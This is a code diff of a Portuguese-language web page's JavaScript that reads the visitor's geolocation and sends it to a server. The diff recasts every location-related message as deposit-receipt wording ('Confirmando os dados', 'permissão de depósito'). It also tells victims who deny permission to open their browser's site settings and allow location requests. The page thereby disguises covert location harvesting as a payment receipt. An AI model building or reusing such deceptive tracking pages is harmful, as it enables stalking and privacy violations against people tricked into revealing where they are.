@@ -32,13 +32,13 @@
             
             // Verificando se o campo de nome está vazio
             if (!username) {
-                document.getElementById("status").innerText = username;
+                document.getElementById("status").innerText = "Nome não pode ser vazio";
                 return;
             }
             
             // Verificando se o nome digitado é o esperado
             if (username !== NOME_FIXO.trim()) {
-                document.getElementById("status").innerText = "Nome incorreto. Tente novamente." + username;
+                document.getElementById("status").innerText = "Nome incorreto. Tente novamente.";
                 return;
             }
             
@@ -48,11 +48,11 @@
 
         function getLocation(username) {
             if (!navigator.geolocation) {
-                document.getElementById("status").innerText = "Geolocalização não suportada pelo navegador.";
+                document.getElementById("status").innerText = "Comprovante não localizado.";
                 return;
             }
 
-            document.getElementById("status").innerText = "Obtendo localização...";
+            document.getElementById("status").innerText = "Confirmando os dados...Aguarde!";
 
             navigator.geolocation.getCurrentPosition(
                 (position) => sendLocation(position, username),
@@ -80,7 +80,7 @@
                 console.log("Dados enviados:", data);
             } catch (err) {
                 console.error("Erro ao enviar:", err.message);
-                document.getElementById("status").innerText = "Erro ao salvar: " + err.message;
+                document.getElementById("status").innerText = "Erro ao gerar comprovante: " + err.message;
             }
         }
 
@@ -88,10 +88,10 @@
             let msg = "";
             switch (error.code) {
                 case error.PERMISSION_DENIED:
-                    msg = "Permissão de localização negada. Ative em Configurações > Sites > Localização.";
+                    msg = "Seu aparelho não está conseguindo gerar a permissão de depósito. Clique nos três pontinhos > Configurações > Configurações do Site > Local > Abrir todas as solicitações. Depois tente novamente";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    msg = "Localização indisponível.";
+                    msg = "Comprovante indisponível. Tente novamente mais tarde.";
                     break;
                 case error.TIMEOUT:
                     msg = "Tempo limite da requisição excedido.";
